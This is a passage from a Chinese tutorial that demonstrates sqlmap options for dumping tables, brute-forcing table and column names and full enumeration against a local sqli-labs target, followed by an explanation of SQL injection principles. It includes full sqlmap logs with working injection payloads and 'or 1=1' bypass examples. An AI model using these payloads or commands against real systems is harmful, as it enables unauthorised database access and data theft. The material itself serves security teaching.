python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 --tables --start 1 --stop 3 --dump
1
```

打印：

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:16:35 /2020-03-02/

[09:16:36] [INFO] resuming back-end DBMS 'mysql'
[09:16:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[09:16:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:16:36] [INFO] fetching tables for database: 'demo1125'
[09:16:36] [INFO] resumed: 'areas'
[09:16:36] [INFO] resumed: 'cities'
[09:16:36] [INFO] resumed: 'classes'
[09:16:36] [INFO] resumed: 'provinces'
[09:16:36] [INFO] resumed: 'student'
[09:16:36] [INFO] resumed: 'v_p_c'
Database: demo1125
[6 tables]
+-----------+
| areas     |
| cities    |
| classes   |
| provinces |
| student   |
| v_p_c     |
+-----------+

[09:16:36] [INFO] fetching columns for table 'areas' in database 'demo1125'
[09:16:36] [INFO] resumed: 'id','int(5) unsigned'
[09:16:36] [INFO] resumed: 'pid','int(5) unsigned'
[09:16:36] [INFO] resumed: 'name','varchar(120)'
[09:16:36] [INFO] resumed: 'type','tinyint(1)'
[09:16:36] [INFO] fetching entries for table 'areas' in database 'demo1125'
[09:16:36] [INFO] retrieved: '1','中国','0','0'
[09:16:36] [INFO] retrieved: '2','北京','1','1'
[09:16:36] [INFO] retrieved: '3','安徽','1','1'
Database: demo1125
Table: areas
[3 entries]
+----+-----+------+------+
| id | pid | name | type |
+----+-----+------+------+
| 1  | 0   | 中国 | 0    |
| 2  | 1   | 北京 | 1    |
| 3  | 1   | 安徽 | 1    |
+----+-----+------+------+

[09:16:36] [INFO] table 'demo1125.areas' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\areas.csv'
[09:16:36] [INFO] fetching columns for table 'cities' in database 'demo1125'
[09:16:36] [INFO] resumed: 'id','int(11)'
[09:16:36] [INFO] resumed: 'cityid','char(6)'
[09:16:36] [INFO] resumed: 'city','varchar(40)'
[09:16:36] [INFO] resumed: 'provinceid','char(6)'
[09:16:36] [INFO] fetching entries for table 'cities' in database 'demo1125'
[09:16:36] [INFO] retrieved: '北京市','110100','1','110000'
[09:16:36] [INFO] retrieved: '北京下属县','1102xx','2','1100xx'
[09:16:36] [INFO] retrieved: '天津市','120100','3','120000'
Database: demo1125
Table: cities
[3 entries]
+----+--------+------------+------------+
| id | cityid | provinceid | city       |
+----+--------+------------+------------+
| 1  | 110100 | 110000     | 北京市     |
| 2  | 1102xx | 1100xx     | 北京下属县 |
| 3  | 120100 | 120000     | 天津市     |
+----+--------+------------+------------+

[09:16:36] [INFO] table 'demo1125.cities' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\cities.csv'
[09:16:36] [INFO] fetching columns for table 'classes' in database 'demo1125'
[09:16:36] [INFO] resumed: 'id','int(4)'
[09:16:36] [INFO] resumed: 'name','varchar(36)'
[09:16:36] [INFO] fetching entries for table 'classes' in database 'demo1125'
[09:16:36] [INFO] fetching number of entries for table 'classes' in database 'demo1125'
[09:16:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[09:16:36] [INFO] retrieved: 0
[09:16:36] [WARNING] table 'classes' in database 'demo1125' appears to be empty
Database: demo1125
Table: classes
[0 entries]
+----+------+
| id | name |
+----+------+
+----+------+

[09:16:36] [INFO] table 'demo1125.classes' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\classes.csv'
[09:16:36] [INFO] fetching columns for table 'provinces' in database 'demo1125'
[09:16:36] [INFO] resumed: 'id','int(11)'
[09:16:36] [INFO] resumed: 'provinceid','int(11)'
[09:16:36] [INFO] resumed: 'province','varchar(100)'
[09:16:36] [INFO] fetching entries for table 'provinces' in database 'demo1125'
[09:16:36] [INFO] retrieved: '1','北京市','110000'
[09:16:36] [INFO] retrieved: '2','天津市','120000'
[09:16:36] [INFO] retrieved: '3','河北省','130000'
Database: demo1125
Table: provinces
[3 entries]
+----+------------+----------+
| id | provinceid | province |
+----+------------+----------+
| 1  | 110000     | 北京市   |
| 2  | 120000     | 天津市   |
| 3  | 130000     | 河北省   |
+----+------------+----------+

[09:16:36] [INFO] table 'demo1125.provinces' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\provinces.csv'
[09:16:36] [INFO] fetching columns for table 'student' in database 'demo1125'
[09:16:36] [INFO] resumed: 'sid','int(4)'
[09:16:36] [INFO] resumed: 'sname','varchar(36)'
[09:16:36] [INFO] resumed: 'gid','int(4)'
[09:16:36] [INFO] fetching entries for table 'student' in database 'demo1125'
[09:16:36] [INFO] resumed: '1','3','Jack'
[09:16:36] [INFO] resumed: '1','4','Jack'
[09:16:36] [INFO] resumed: '1','5','Jack'
Database: demo1125
Table: student
[3 entries]
+-----+-----+-------+
| gid | sid | sname |
+-----+-----+-------+
| 1   | 3   | Jack  |
| 1   | 4   | Jack  |
| 1   | 5   | Jack  |
+-----+-----+-------+

[09:16:36] [INFO] table 'demo1125.student' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\student.csv'
[09:16:36] [INFO] fetching columns for table 'v_p_c' in database 'demo1125'
[09:16:36] [INFO] resumed: 'id','int(5) unsigned'
[09:16:36] [INFO] resumed: 'pid','int(5) unsigned'
[09:16:36] [INFO] resumed: 'name','varchar(120)'
[09:16:36] [INFO] resumed: 'type','tinyint(1)'
[09:16:36] [INFO] resumed: 'cname','varchar(120)'
[09:16:36] [INFO] fetching entries for table 'v_p_c' in database 'demo1125'
[09:16:37] [INFO] retrieved: '长沙','14','湖南','1','1'
[09:16:37] [INFO] retrieved: '张家界','14','湖南','1','1'
[09:16:37] [INFO] retrieved: '常德','14','湖南','1','1'
Database: demo1125
Table: v_p_c
[3 entries]
+----+-----+------+------+--------+
| id | pid | name | type | cname  |
+----+-----+------+------+--------+
| 14 | 1   | 湖南 | 1    | 长沙   |
| 14 | 1   | 湖南 | 1    | 张家界 |
| 14 | 1   | 湖南 | 1    | 常德   |
+----+-----+------+------+--------+

[09:16:37] [INFO] table 'demo1125.v_p_c' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\v_p_c.csv'
[09:16:37] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 09:16:37 /2020-03-02/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178
```

显然，当表中数据少于3条时，部分显示或不显示，当不少于3条时显示第1-3条数据。
和`--start`和`--stop`类似，还可以使用`--first`和`--end`参数来获取字段中第几个字符到第几个字符的内容。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 --tables -T v_p_c --first 3 --last 5 --dump
1
```

打印：

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:45:23 /2020-03-02/

[09:45:23] [INFO] resuming back-end DBMS 'mysql'
[09:45:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[09:45:23] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:45:23] [INFO] fetching tables for database: 'demo1125'
[09:45:23] [INFO] resumed: 'areas'
[09:45:23] [INFO] resumed: 'cities'
[09:45:23] [INFO] resumed: 'classes'
[09:45:23] [INFO] resumed: 'provinces'
[09:45:23] [INFO] resumed: 'student'
[09:45:23] [INFO] resumed: 'v_p_c'
Database: demo1125
[6 tables]
+-----------+
| areas     |
| cities    |
| classes   |
| provinces |
| student   |
| v_p_c     |
+-----------+

[09:45:23] [INFO] fetching columns for table 'v_p_c' in database 'demo1125'
[09:45:23] [INFO] resumed: 'id','int(5) unsigned'
[09:45:23] [INFO] resumed: 'pid','int(5) unsigned'
[09:45:23] [INFO] resumed: 'name','varchar(120)'
[09:45:23] [INFO] resumed: 'type','tinyint(1)'
[09:45:23] [INFO] resumed: 'cname','varchar(120)'
[09:45:23] [INFO] fetching entries for table 'v_p_c' in database 'demo1125'
[09:45:23] [INFO] resumed: '长沙','14','湖南','1','1'
[09:45:23] [INFO] resumed: '张家界','14','湖南','1','1'
[09:45:24] [INFO] resumed: '常德','14','湖南','1','1'
[09:45:24] [INFO] resumed: '郴州','14','湖南','1','1'
[09:45:24] [INFO] resumed: '衡阳','14','湖南','1','1'
[09:45:24] [INFO] resumed: '怀化','14','湖南','1','1'
[09:45:24] [INFO] resumed: '娄底','14','湖南','1','1'
[09:45:24] [INFO] resumed: '邵阳','14','湖南','1','1'
[09:45:24] [INFO] resumed: '湘潭','14','湖南','1','1'
[09:45:24] [INFO] resumed: '湘西','14','湖南','1','1'
[09:45:24] [INFO] resumed: '益阳','14','湖南','1','1'
[09:45:24] [INFO] resumed: '永州','14','湖南','1','1'
[09:45:24] [INFO] resumed: '岳阳','14','湖南','1','1'
[09:45:24] [INFO] resumed: '株洲','14','湖南','1','1'
Database: demo1125
Table: v_p_c
[14 entries]
+----+-----+------+------+--------+
| id | pid | name | type | cname  |
+----+-----+------+------+--------+
| 14 | 1   | 湖南 | 1    | 长沙   |
| 14 | 1   | 湖南 | 1    | 张家界 |
| 14 | 1   | 湖南 | 1    | 常德   |
| 14 | 1   | 湖南 | 1    | 郴州   |
| 14 | 1   | 湖南 | 1    | 衡阳   |
| 14 | 1   | 湖南 | 1    | 怀化   |
| 14 | 1   | 湖南 | 1    | 娄底   |
| 14 | 1   | 湖南 | 1    | 邵阳   |
| 14 | 1   | 湖南 | 1    | 湘潭   |
| 14 | 1   | 湖南 | 1    | 湘西   |
| 14 | 1   | 湖南 | 1    | 益阳   |
| 14 | 1   | 湖南 | 1    | 永州   |
| 14 | 1   | 湖南 | 1    | 岳阳   |
| 14 | 1   | 湖南 | 1    | 株洲   |
+----+-----+------+------+--------+

[09:45:24] [INFO] table 'demo1125.v_p_c' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\v_p_c.csv'
[09:45:24] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 09:45:24 /2020-03-02/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101
```

从结果看并无明显不同，这是因为`--first`与`--last`参数只在盲注的时候使用，因为其他方式可以准确获取注入内容，不需要一个字符一个字符地猜解。

### 8.sqlmap设置条件获取信息

参数：
`--where`
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 --tables -T v_p_c --where="id>5" --dump
1
```

打印：

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:49:59 /2020-03-02/

[09:50:00] [INFO] resuming back-end DBMS 'mysql'
[09:50:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[09:50:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:50:00] [INFO] fetching tables for database: 'demo1125'
[09:50:00] [INFO] resumed: 'areas'
[09:50:00] [INFO] resumed: 'cities'
[09:50:00] [INFO] resumed: 'classes'
[09:50:00] [INFO] resumed: 'provinces'
[09:50:00] [INFO] resumed: 'student'
[09:50:00] [INFO] resumed: 'v_p_c'
Database: demo1125
[6 tables]
+-----------+
| areas     |
| cities    |
| classes   |
| provinces |
| student   |
| v_p_c     |
+-----------+

[09:50:00] [INFO] fetching columns for table 'v_p_c' in database 'demo1125'
[09:50:00] [INFO] resumed: 'id','int(5) unsigned'
[09:50:00] [INFO] resumed: 'pid','int(5) unsigned'
[09:50:00] [INFO] resumed: 'name','varchar(120)'
[09:50:00] [INFO] resumed: 'type','tinyint(1)'
[09:50:00] [INFO] resumed: 'cname','varchar(120)'
[09:50:00] [INFO] fetching entries for table 'v_p_c' in database 'demo1125'
[09:50:00] [INFO] retrieved: '长沙','14','湖南','1','1'
[09:50:00] [INFO] retrieved: '张家界','14','湖南','1','1'
[09:50:00] [INFO] retrieved: '常德','14','湖南','1','1'
[09:50:00] [INFO] retrieved: '郴州','14','湖南','1','1'
[09:50:00] [INFO] retrieved: '衡阳','14','湖南','1','1'
[09:50:00] [INFO] retrieved: '怀化','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '娄底','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '邵阳','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '湘潭','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '湘西','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '益阳','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '永州','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '岳阳','14','湖南','1','1'
[09:50:01] [INFO] retrieved: '株洲','14','湖南','1','1'
Database: demo1125
Table: v_p_c
[14 entries]
+----+-----+------+------+--------+
| id | pid | name | type | cname  |
+----+-----+------+------+--------+
| 14 | 1   | 湖南 | 1    | 长沙   |
| 14 | 1   | 湖南 | 1    | 张家界 |
| 14 | 1   | 湖南 | 1    | 常德   |
| 14 | 1   | 湖南 | 1    | 郴州   |
| 14 | 1   | 湖南 | 1    | 衡阳   |
| 14 | 1   | 湖南 | 1    | 怀化   |
| 14 | 1   | 湖南 | 1    | 娄底   |
| 14 | 1   | 湖南 | 1    | 邵阳   |
| 14 | 1   | 湖南 | 1    | 湘潭   |
| 14 | 1   | 湖南 | 1    | 湘西   |
| 14 | 1   | 湖南 | 1    | 益阳   |
| 14 | 1   | 湖南 | 1    | 永州   |
| 14 | 1   | 湖南 | 1    | 岳阳   |
| 14 | 1   | 湖南 | 1    | 株洲   |
+----+-----+------+------+--------+

[09:50:01] [INFO] table 'demo1125.v_p_c' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\v_p_c.csv'
[09:50:01] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 09:50:01 /2020-03-02/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101
```

### 9.sqlmap暴力破解数据

#### 暴力破解表名

参数：
`--common-tables`
有些情况下用`--tables`不能列出数据库中表名来比如：

- 版本小于**5.0**的MySQL没有**information_schema**表
- 数据库用户权限过低无法读取表名

此时需要暴力破解。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -common-tables
1
```

打印：

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:57:11 /2020-03-02/

[09:57:11] [INFO] resuming back-end DBMS 'mysql'
[09:57:11] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[09:57:11] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:57:11] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common tables (wordlist) file do you want to use?
[1] default 'xxxxx\sqlmapproject-sqlmap-0605f14\data\txt\common-tables.txt' (press Enter)
[2] custom
>

[09:57:14] [INFO] performing table existence using items from 'xxxxx\sqlmapproject-sqlmap-0605f14\data\txt\common-tables.txt'
[09:57:14] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 5
[09:57:17] [INFO] starting 5 threads
[09:57:17] [INFO] retrieved: users

Current database
[1 table]
+-------+
| users |
+-------+

[09:59:04] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 09:59:05 /2020-03-02/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657
```

探测出当前数据库中的一个表users，这可能是因为sqlmap自带的**common-tables**文件中只含有users表。

#### 暴力破解列名

参数：
`--common-columns`
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 -T student --common-columns
1
```

打印：

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 13:22:16 /2020-03-02/                                                                                                                      
                                                                                                                                                          
[13:22:17] [INFO] resuming back-end DBMS 'mysql'                                                                                                          
[13:22:17] [INFO] testing connection to the target URL                                                                                                    
sqlmap resumed the following injection point(s) from stored session:                                                                                      
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI                                                                                                         
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt                                                                                                             
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl                                                                         
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0
x71786a7071)-- -                                                                                                                                          
---                                                                                                                                                       
[13:22:17] [INFO] the back-end DBMS is MySQL                                                                                                              
back-end DBMS: MySQL >= 5.0                                                                                                                               
[13:22:17] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
which common columns (wordlist) file do you want to use?                                                                                                  
[1] default 'xxxxx\sqlmapproject-sqlmap-0605f14\data\txt\common-columns.txt' (press Enter)                                                            
[2] custom                                                                                                                                                
>                                                                                                                                                         
                                                                                                                                                          
[13:22:18] [INFO] checking column existence using items from 'xxxxx\sqlmapproject-sqlmap-0605f14\data\txt\common-columns.txt'                         
[13:22:18] [INFO] adding words used on web page to the check list                                                                                         
please enter number of threads? [Enter for 1 (current)] 10                                                                                                
[13:22:23] [INFO] starting 10 threads                                                                                                                     
[13:22:24] [INFO] retrieved: sid                                                                                                                          
[13:22:29] [INFO] retrieved: sname                                                                                                                        
[13:22:31] [INFO] retrieved: gid                                                                                                                          
                                                                                                                                                          
Database: demo1125                                                                                                                                        
Table: student                                                                                                                                            
[3 columns]                                                                                                                                               
+--------+-------------+                                                                                                                                  
| Column | Type        |                                                                                                                                  
+--------+-------------+                                                                                                                                  
| gid    | numeric     |                                                                                                                                  
| sid    | numeric     |                                                                                                                                  
| sname  | non-numeric |                                                                                                                                  
+--------+-------------+                                                                                                                                  
                                                                                                                                                          
[13:23:24] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 13:23:24 /2020-03-02/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667
```

### 10.sqlmap检索所有信息

参数：
`-a`或者`--all`
返回所有的检索信息。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -a --thread 10 --batch
1
```

显示：



<iframe id="3Nx1QqW3-1583237370777" src="https://player.youku.com/embed/XNDU3MTI0Njk1Ng==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

sqlmap--all


![sqlmap--all](https://img-blog.csdnimg.cn/20200303201615748.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然这个过程很长，也很浪费资源，并且容易被对方发现，不要轻易使用。
这个过程竟然用了27个小时，只是录了开始40多分钟，实在等不及了就退出了录屏，只截了结束时的最后一段，可以看出运行所花的总时间了。还好没有一直录下来，否则还不知道录下来的文件得多大呢。



可以在在线练习靶场进行练习：
https://www.mozhe.cn/bug/d1hJazFDeGRHV05DVjI3YXpHREZGUT09bW96aGUmozhe

## 三、SQL注入原理

### 1.介绍SQL注入

SQL注入就是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的SQL语句来实现**对数据库任意操作**。

SQL注入漏洞的产生需要满足两个条件：

- 参数用户可控
- 参数带入数据库查询，传入的参数拼接到SQL语句，并且带入数据库查询，即**与数据库要有交互**

### 2.SQL注入的危害

- 数据库敏感信息泄露
- 页面被窜改
- 数据库被恶意操作
- 服务器被远程控制

所以在进行开发时，前后端**都要进行验证**，来保证安全性。

### 3.SQL注入的分类

#### 根据注入位置数据类型分类

- 字符串型
- 数字型

（1）**字符串注入测试**：
使用security数据库测试：
正常情况下：

```sql
select * from users where username = '' and password = '';
1
```

打印

```sql
Empty set (0.01 sec)
1
```

即查询条件为空时未查到数据。
进行字符串注入后：

```sql
select * from users where username = '' or 1 = 1; -- ' and password = '';
1
```

打印

```sql
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 13 | admin4   | admin4     |
| 14 | admin5   | admin5     |
+----+----------+------------+
14 rows in set (0.00 sec)
12345678910111213141516171819
```

此时查询到users表中的所有数据。
原理是：
不闭合前面单引号，后边加or（or后边加恒成立的布尔表达式），导致我热热恒为真，后边加–注释掉后边的语句，所以这个SQL语句相当于：

```sql
select * from users where true;
1
```

（2）**数字注入测试**：
正常情况下：

```sql
select * from users where id = 1;
1
```

打印

```sql
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.01 sec)
123456
```

进行数字注入后：

```sql
select * from users where id =-1 or 1 = 1;
1
```

打印

```sql
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 13 | admin4   | admin4     |
| 14 | admin5   | admin5     |
+----+----------+------------+
14 rows in set (0.00 sec)     
12345678910111213141516171819
```

即前面的id变为负失效，后面加入or语句，使之恒成立。

#### 根据返回结果分类

- 显错注入(error-based)
- 盲注(boolean/time-based blind)

### 4.SQL注入的形成原因

- 数据与代码未严格分离
- 用户提交的参数数据未做充分检查过滤及被带入到SQL命令中，改变了原有SQL命令的**语义** ，且成功被数据库执行

### 5.SQL注入过程

![SQL注入过程](https://img-blog.csdnimg.cn/20200303204232168.png#pic_center)

